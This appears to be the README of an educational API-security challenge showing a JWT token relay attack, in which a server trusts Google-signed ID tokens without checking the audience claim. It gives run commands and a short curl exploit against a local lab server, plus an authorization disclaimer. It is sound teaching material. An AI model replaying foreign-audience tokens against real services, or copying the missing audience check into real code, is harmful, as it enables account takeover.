# JWT Google Token Relay Attack

This challenge demonstrates a token cross-service relay attack against a relying party that trusts Google as its identity provider. The server verifies the RSA signature and the `iss` claim (`https://accounts.google.com`) against Google's public key, but never validates the `aud` claim. Any ID token minted by Google - including one issued for a completely different, attacker-registered application - is therefore accepted, even though it was never intended for this relying party (`aud: 184921307134-a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.apps.googleusercontent.com`).

## How to run it

```bash
go run main.go serve
```

## How to exploit it

```bash
# Attacker registers their own app with Google and signs in through it,
# receiving a legitimately signed ID token scoped to their app (aud: 705918273645-z9y8x7w6v5u4t3s2r1q0p9o8n7m6l5k4.apps.googleusercontent.com)
TOKEN=$(go run main.go jwt-attacker-app)

# Relay that token to the victim relying party - the audience is never
# checked, so the token is accepted as if it were issued for it
curl -i http://localhost:8080/ -H "Authorization: Bearer $TOKEN"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
